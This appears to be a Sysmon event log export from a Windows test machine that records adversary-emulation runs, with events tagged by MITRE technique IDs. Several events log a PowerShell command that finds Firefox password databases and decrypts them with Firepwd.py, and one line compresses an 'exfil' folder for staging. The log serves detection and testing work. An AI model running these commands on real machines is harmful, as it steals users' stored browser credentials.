+compress-archive -path \""""$exfil_folder\"""" -destinationpath \""""$exfil_folder.zip\"""" -force}
+CurrentDirectory: C:\Users\Test\AppData\Local\Temp\
+User: DESKTOP-92IIJB9\Test
+LogonGuid: {1ac2ee8c-5412-656d-4c1f-130000000000}
+LogonId: 0x131F4C
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: SHA1=EB39E26A364ECD0691A59FCEF61A90334112617E,MD5=BCF01E61144D6D6325650134823198B8,SHA256=B4E7BC24BF3F5C3DA2EB6E9EC5EC10F90099DEFA91B820F2F3FC70DD9E4785C4,IMPHASH=88CB9A420410BDA787E305B65518A934
+ParentProcessGuid: {1ac2ee8c-5439-656d-4601-000000001000}
+ParentProcessId: 3600
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
+ParentUser: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:22 PM,Microsoft-Windows-Sysmon,13,Registry value set (rule: RegistryEvent),"Registry value set:
+RuleName: -
+EventType: SetValue
+UtcTime: 2023-12-04 04:35:22.896
+ProcessGuid: {1ac2ee8c-5439-656d-4601-000000001000}
+ProcessId: 3600
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetObject: HKLM\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-275153265-2143659952-3435977433-1001\\Device\HarddiskVolume2\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Details: Binary Data
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:22 PM,Microsoft-Windows-Sysmon,13,Registry value set (rule: RegistryEvent),"Registry value set:
+RuleName: -
+EventType: SetValue
+UtcTime: 2023-12-04 04:35:22.725
+ProcessGuid: {1ac2ee8c-5709-656d-df02-000000001000}
+ProcessId: 7908
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetObject: HKLM\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-275153265-2143659952-3435977433-1001\\Device\HarddiskVolume2\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Details: Binary Data
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:22 PM,Microsoft-Windows-Sysmon,11,File created (rule: FileCreate),"File created:
+RuleName: -
+UtcTime: 2023-12-04 04:35:22.709
+ProcessGuid: {1ac2ee8c-5709-656d-df02-000000001000}
+ProcessId: 7908
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Test\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive
+CreationUtcTime: 2023-12-04 04:32:15.278
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:22 PM,Microsoft-Windows-Sysmon,10,Process accessed (rule: ProcessAccess),"Process accessed:
+RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
+UtcTime: 2023-12-04 04:35:22.693
+SourceProcessGUID: {1ac2ee8c-5709-656d-df02-000000001000}
+SourceProcessId: 7908
+SourceThreadId: 8680
+SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetProcessGUID: {1ac2ee8c-570a-656d-e102-000000001000}
+TargetProcessId: 5908
+TargetImage: C:\Windows\system32\cmd.exe
+GrantedAccess: 0x1FFFFF
+CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9e924|C:\Windows\System32\KERNELBASE.dll+5b473|C:\Windows\System32\KERNELBASE.dll+597e6|C:\Windows\System32\KERNEL32.DLL+1d334|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+351226|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3bb9|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3529|UNKNOWN(00007FF96BA802A4)
+SourceUser: DESKTOP-92IIJB9\Test
+TargetUser: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:22 PM,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
+RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
+UtcTime: 2023-12-04 04:35:22.690
+ProcessGuid: {1ac2ee8c-570a-656d-e102-000000001000}
+ProcessId: 5908
+Image: C:\Windows\System32\cmd.exe
+FileVersion: 10.0.19041.746 (WinBuild.160101.0800)
+Description: Windows Command Processor
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: Cmd.Exe
+CommandLine: ""C:\Windows\system32\cmd.exe"" /c C:temp\..\ExternalPayloads\Firepwd.py -d 
+CurrentDirectory: C:\Users\Test\AppData\Local\Temp\
+User: DESKTOP-92IIJB9\Test
+LogonGuid: {1ac2ee8c-5412-656d-4c1f-130000000000}
+LogonId: 0x131F4C
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: SHA1=F1EFB0FDDC156E4C61C5F78A54700E4E7984D55D,MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18
+ParentProcessGuid: {1ac2ee8c-5709-656d-df02-000000001000}
+ParentProcessId: 7908
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentCommandLine: ""powershell.exe"" & {$PasswordDBLocation = get-childitem -path \""""$env:appdata\Mozilla\Firefox\Profiles\*.default-release\\""""
+cmd /c C:temp\..\ExternalPayloads\Firepwd.py -d $PasswordDBLocation > $env:temp\T1555.003Test8.txt
+cat $env:temp\T1555.003Test8.txt}
+ParentUser: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:22 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1574.002,technique_name=DLL Side-Loading
+UtcTime: 2023-12-04 04:35:22.069
+ProcessGuid: {1ac2ee8c-5709-656d-df02-000000001000}
+ProcessId: 7908
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23100.2009-0\MpClient.dll
+FileVersion: 4.18.23100.2009 (8fcbd1c22d82af16ba34560e1a70591413e88d17)
+Description: Client Interface
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: mpclient.dll
+Hashes: SHA1=212A30C8880BB14FE79802A1B0492CAE21D1B736,MD5=F6241AA123B9835ADD945B91D3805629,SHA256=5CFA0ACF6BD10FBEB3DB7FB642AE68EBE9F9C01D9F49A6082D1432914E766C57,IMPHASH=B9FF20C6C7B890C0C363159B3EA2D8CC
+Signed: true
+Signature: Microsoft Windows
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:21 PM,Microsoft-Windows-Sysmon,17,Pipe Created (rule: PipeEvent),"Pipe Created:
+RuleName: -
+EventType: CreatePipe
+UtcTime: 2023-12-04 04:35:21.693
+ProcessGuid: {1ac2ee8c-5709-656d-df02-000000001000}
+ProcessId: 7908
+PipeName: \PSHost.133461381215130789.7908.DefaultAppDomain.powershell
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:21 PM,Microsoft-Windows-Sysmon,26,File Delete logged (rule: FileDeleteDetected),"File Delete logged:
+RuleName: -
+UtcTime: 2023-12-04 04:35:21.615
+ProcessGuid: {1ac2ee8c-5709-656d-df02-000000001000}
+ProcessId: 7908
+User: DESKTOP-92IIJB9\Test
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Test\AppData\Local\Temp\__PSScriptPolicyTest_ge0lr225.m5z.ps1
+Hashes: SHA1=6AB83620379FC69F80C0242105DDFFD7D98D5D9D,MD5=D17FE0A3F47BE24A6453E9EF58C94641,SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7,IMPHASH=00000000000000000000000000000000
+IsExecutable: false"
+Information,12/3/2023 8:35:21 PM,Microsoft-Windows-Sysmon,11,File created (rule: FileCreate),"File created:
+RuleName: technique_id=T1059.001,technique_name=PowerShell
+UtcTime: 2023-12-04 04:35:21.615
+ProcessGuid: {1ac2ee8c-5709-656d-df02-000000001000}
+ProcessId: 7908
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Test\AppData\Local\Temp\__PSScriptPolicyTest_ge0lr225.m5z.ps1
+CreationUtcTime: 2023-12-04 04:35:21.615
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:21 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1574.002,technique_name=DLL Side-Loading
+UtcTime: 2023-12-04 04:35:21.569
+ProcessGuid: {1ac2ee8c-5709-656d-df02-000000001000}
+ProcessId: 7908
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23100.2009-0\MpOAV.dll
+FileVersion: 4.18.23100.2009 (8fcbd1c22d82af16ba34560e1a70591413e88d17)
+Description: IOfficeAntiVirus Module
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: MpOAV.dll
+Hashes: SHA1=E5E75A15EE46E0968665FF180C34880E163F27F0,MD5=E8EA978A581E6C3A616E69939CB2F5F3,SHA256=077043850436F281BB354D03A7F33042543E7C2BF4F46A865BAE60F37D8DEBDB,IMPHASH=28D3DE166C9E9C46DC0EA2089E2AC74E
+Signed: true
+Signature: Microsoft Windows
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:21 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:21.537
+ProcessGuid: {1ac2ee8c-5709-656d-df02-000000001000}
+ProcessId: 7908
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clrjit.dll
+FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
+Description: Microsoft .NET Runtime Just-In-Time Compiler
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: clrjit.dll
+Hashes: SHA1=7DCB8796F45514DD3F5CD55302B041319814A755,MD5=7412728F1DC9015FC4CC18AC6052B330,SHA256=001D135E1066C1BFAE80D33F15636206E2F81AF5A92D99F1335DE2E30D2561BA,IMPHASH=E20BEEF68C4C15FC6DC00AEDFC450D3C
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:21 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:21.537
+ProcessGuid: {1ac2ee8c-5709-656d-df02-000000001000}
+ProcessId: 7908
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NativeImages\mscorlib.ni.dll
+FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
+Description: Microsoft Common Language Runtime Class Library
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: mscorlib.dll
+Hashes: SHA1=D0C40D928F13CF2F17741DAD44F8BA0045CAB6D2,MD5=1031BE45F7D69BA2F14CE068FFD33B25,SHA256=BC29F7D665E89E154B897FC1B122A91ADD9D74D5B4059B6BFF28CDE7D616E7CD,IMPHASH=00000000000000000000000000000000
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:21 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:21.537
+ProcessGuid: {1ac2ee8c-5709-656d-df02-000000001000}
+ProcessId: 7908
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clr.dll
+FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
+Description: Microsoft .NET Runtime Common Language Runtime - WorkStation
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: clr.dll
+Hashes: SHA1=A77574470F744120D0AB5DD39A5D11D617FBEE31,MD5=6D8BC8BC19D5D926AF8FE4DC0D3DC071,SHA256=F5C68CED002FF441C7C5AA1083604FBA555E3D3CA6205E85E228009E59759313,IMPHASH=AB5E2E36C1E62672DDDD7B4D2E5D81D4
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:21 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:21.537
+ProcessGuid: {1ac2ee8c-5709-656d-df02-000000001000}
+ProcessId: 7908
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscoreei.dll
+FileVersion: 4.8.9093.0 built by: NET481REL1LAST_C
+Description: Microsoft .NET Runtime Execution Engine
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: mscoreei.dll
+Hashes: SHA1=2186F29C0312A9BE5B9D08BD3A95DFC14A7BB0A4,MD5=89AB48AC59F9E5302E10A6A2ED5E9F9E,SHA256=791E1A6F0C1024B2AC8142F0D85B25A7510B57606EF2D903289BE76970ADE9DD,IMPHASH=BDAAD270BEE58C9A3A7622CD1CA3EF79
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:21 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:21.522
+ProcessGuid: {1ac2ee8c-5709-656d-df02-000000001000}
+ProcessId: 7908
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\System32\mscoree.dll
+FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
+Description: Microsoft .NET Runtime Execution Engine
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: mscoree.dll
+Hashes: SHA1=CFEF8F0BA040939B87B74F101970A6BBEB5DA15F,MD5=D5971EF71DE1BDD46D537203ABFCC756,SHA256=8828DE042D008783BA5B31C82935A3ED38D5996927C3399B3E1FC6FE723FC84E,IMPHASH=65F23EFA1EB51A5DAAB399BFAA840074
+Signed: true
+Signature: Microsoft Windows
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:21 PM,Microsoft-Windows-Sysmon,10,Process accessed (rule: ProcessAccess),"Process accessed:
+RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
+UtcTime: 2023-12-04 04:35:21.506
+SourceProcessGUID: {1ac2ee8c-5439-656d-4601-000000001000}
+SourceProcessId: 3600
+SourceThreadId: 8604
+SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetProcessGUID: {1ac2ee8c-5709-656d-df02-000000001000}
+TargetProcessId: 7908
+TargetImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+GrantedAccess: 0x1FFFFF
+CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9e924|C:\Windows\System32\KERNELBASE.dll+5b473|C:\Windows\System32\KERNELBASE.dll+597e6|C:\Windows\System32\KERNEL32.DLL+1d334|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+351226|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3bb9|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3529|UNKNOWN(00007FF96CAB2D25)
+SourceUser: DESKTOP-92IIJB9\Test
+TargetUser: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:21 PM,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
+RuleName: technique_id=T1059.001,technique_name=PowerShell
+UtcTime: 2023-12-04 04:35:21.513
+ProcessGuid: {1ac2ee8c-5709-656d-df02-000000001000}
+ProcessId: 7908
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.19041.2913 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: ""powershell.exe"" & {$PasswordDBLocation = get-childitem -path \""""$env:appdata\Mozilla\Firefox\Profiles\*.default-release\\""""
+cmd /c C:temp\..\ExternalPayloads\Firepwd.py -d $PasswordDBLocation > $env:temp\T1555.003Test8.txt
+cat $env:temp\T1555.003Test8.txt}
+CurrentDirectory: C:\Users\Test\AppData\Local\Temp\
+User: DESKTOP-92IIJB9\Test
+LogonGuid: {1ac2ee8c-5412-656d-4c1f-130000000000}
+LogonId: 0x131F4C
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: SHA1=EB39E26A364ECD0691A59FCEF61A90334112617E,MD5=BCF01E61144D6D6325650134823198B8,SHA256=B4E7BC24BF3F5C3DA2EB6E9EC5EC10F90099DEFA91B820F2F3FC70DD9E4785C4,IMPHASH=88CB9A420410BDA787E305B65518A934
+ParentProcessGuid: {1ac2ee8c-5439-656d-4601-000000001000}
+ParentProcessId: 3600
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
+ParentUser: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:21 PM,Microsoft-Windows-Sysmon,13,Registry value set (rule: RegistryEvent),"Registry value set:
+RuleName: -
+EventType: SetValue
+UtcTime: 2023-12-04 04:35:21.506
+ProcessGuid: {1ac2ee8c-5439-656d-4601-000000001000}
+ProcessId: 3600
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetObject: HKLM\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-275153265-2143659952-3435977433-1001\\Device\HarddiskVolume2\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Details: Binary Data
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:21 PM,Microsoft-Windows-Sysmon,13,Registry value set (rule: RegistryEvent),"Registry value set:
+RuleName: -
+EventType: SetValue
+UtcTime: 2023-12-04 04:35:21.147
+ProcessGuid: {1ac2ee8c-5706-656d-dd02-000000001000}
+ProcessId: 8772
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetObject: HKLM\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-275153265-2143659952-3435977433-1001\\Device\HarddiskVolume2\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Details: Binary Data
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:21 PM,Microsoft-Windows-Sysmon,11,File created (rule: FileCreate),"File created:
+RuleName: -
+UtcTime: 2023-12-04 04:35:21.147
+ProcessGuid: {1ac2ee8c-5706-656d-dd02-000000001000}
+ProcessId: 8772
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Test\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive
+CreationUtcTime: 2023-12-04 04:32:15.278
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:18 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1574.002,technique_name=DLL Side-Loading
+UtcTime: 2023-12-04 04:35:18.647
+ProcessGuid: {1ac2ee8c-5706-656d-dd02-000000001000}
+ProcessId: 8772
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23100.2009-0\MpClient.dll
+FileVersion: 4.18.23100.2009 (8fcbd1c22d82af16ba34560e1a70591413e88d17)
+Description: Client Interface
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: mpclient.dll
+Hashes: SHA1=212A30C8880BB14FE79802A1B0492CAE21D1B736,MD5=F6241AA123B9835ADD945B91D3805629,SHA256=5CFA0ACF6BD10FBEB3DB7FB642AE68EBE9F9C01D9F49A6082D1432914E766C57,IMPHASH=B9FF20C6C7B890C0C363159B3EA2D8CC
+Signed: true
+Signature: Microsoft Windows
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:18 PM,Microsoft-Windows-Sysmon,17,Pipe Created (rule: PipeEvent),"Pipe Created:
+RuleName: -
+EventType: CreatePipe
+UtcTime: 2023-12-04 04:35:18.271
+ProcessGuid: {1ac2ee8c-5706-656d-dd02-000000001000}
+ProcessId: 8772
+PipeName: \PSHost.133461381180739306.8772.DefaultAppDomain.powershell
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:18 PM,Microsoft-Windows-Sysmon,26,File Delete logged (rule: FileDeleteDetected),"File Delete logged:
+RuleName: -
+UtcTime: 2023-12-04 04:35:18.193
+ProcessGuid: {1ac2ee8c-5706-656d-dd02-000000001000}
+ProcessId: 8772
+User: DESKTOP-92IIJB9\Test
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Test\AppData\Local\Temp\__PSScriptPolicyTest_ooeetq5p.kon.ps1
+Hashes: SHA1=6AB83620379FC69F80C0242105DDFFD7D98D5D9D,MD5=D17FE0A3F47BE24A6453E9EF58C94641,SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7,IMPHASH=00000000000000000000000000000000
+IsExecutable: false"
+Information,12/3/2023 8:35:18 PM,Microsoft-Windows-Sysmon,11,File created (rule: FileCreate),"File created:
+RuleName: technique_id=T1059.001,technique_name=PowerShell
+UtcTime: 2023-12-04 04:35:18.162
+ProcessGuid: {1ac2ee8c-5706-656d-dd02-000000001000}
+ProcessId: 8772
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Test\AppData\Local\Temp\__PSScriptPolicyTest_ooeetq5p.kon.ps1
+CreationUtcTime: 2023-12-04 04:35:18.162
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:18 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1574.002,technique_name=DLL Side-Loading
+UtcTime: 2023-12-04 04:35:18.147
+ProcessGuid: {1ac2ee8c-5706-656d-dd02-000000001000}
+ProcessId: 8772
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23100.2009-0\MpOAV.dll
+FileVersion: 4.18.23100.2009 (8fcbd1c22d82af16ba34560e1a70591413e88d17)
+Description: IOfficeAntiVirus Module
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: MpOAV.dll
+Hashes: SHA1=E5E75A15EE46E0968665FF180C34880E163F27F0,MD5=E8EA978A581E6C3A616E69939CB2F5F3,SHA256=077043850436F281BB354D03A7F33042543E7C2BF4F46A865BAE60F37D8DEBDB,IMPHASH=28D3DE166C9E9C46DC0EA2089E2AC74E
+Signed: true
+Signature: Microsoft Windows
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:18 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:18.100
+ProcessGuid: {1ac2ee8c-5706-656d-dd02-000000001000}
+ProcessId: 8772
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clrjit.dll
+FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
+Description: Microsoft .NET Runtime Just-In-Time Compiler
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: clrjit.dll
+Hashes: SHA1=7DCB8796F45514DD3F5CD55302B041319814A755,MD5=7412728F1DC9015FC4CC18AC6052B330,SHA256=001D135E1066C1BFAE80D33F15636206E2F81AF5A92D99F1335DE2E30D2561BA,IMPHASH=E20BEEF68C4C15FC6DC00AEDFC450D3C
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:18 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:18.100
+ProcessGuid: {1ac2ee8c-5706-656d-dd02-000000001000}
+ProcessId: 8772
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NativeImages\mscorlib.ni.dll
+FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
+Description: Microsoft Common Language Runtime Class Library
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: mscorlib.dll
+Hashes: SHA1=D0C40D928F13CF2F17741DAD44F8BA0045CAB6D2,MD5=1031BE45F7D69BA2F14CE068FFD33B25,SHA256=BC29F7D665E89E154B897FC1B122A91ADD9D74D5B4059B6BFF28CDE7D616E7CD,IMPHASH=00000000000000000000000000000000
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:18 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:18.100
+ProcessGuid: {1ac2ee8c-5706-656d-dd02-000000001000}
+ProcessId: 8772
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clr.dll
+FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
+Description: Microsoft .NET Runtime Common Language Runtime - WorkStation
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: clr.dll
+Hashes: SHA1=A77574470F744120D0AB5DD39A5D11D617FBEE31,MD5=6D8BC8BC19D5D926AF8FE4DC0D3DC071,SHA256=F5C68CED002FF441C7C5AA1083604FBA555E3D3CA6205E85E228009E59759313,IMPHASH=AB5E2E36C1E62672DDDD7B4D2E5D81D4
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:18 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:18.084
+ProcessGuid: {1ac2ee8c-5706-656d-dd02-000000001000}
+ProcessId: 8772
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscoreei.dll
+FileVersion: 4.8.9093.0 built by: NET481REL1LAST_C
+Description: Microsoft .NET Runtime Execution Engine
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: mscoreei.dll
+Hashes: SHA1=2186F29C0312A9BE5B9D08BD3A95DFC14A7BB0A4,MD5=89AB48AC59F9E5302E10A6A2ED5E9F9E,SHA256=791E1A6F0C1024B2AC8142F0D85B25A7510B57606EF2D903289BE76970ADE9DD,IMPHASH=BDAAD270BEE58C9A3A7622CD1CA3EF79
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:18 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:18.084
+ProcessGuid: {1ac2ee8c-5706-656d-dd02-000000001000}
+ProcessId: 8772
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\System32\mscoree.dll
+FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
+Description: Microsoft .NET Runtime Execution Engine
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: mscoree.dll
+Hashes: SHA1=CFEF8F0BA040939B87B74F101970A6BBEB5DA15F,MD5=D5971EF71DE1BDD46D537203ABFCC756,SHA256=8828DE042D008783BA5B31C82935A3ED38D5996927C3399B3E1FC6FE723FC84E,IMPHASH=65F23EFA1EB51A5DAAB399BFAA840074
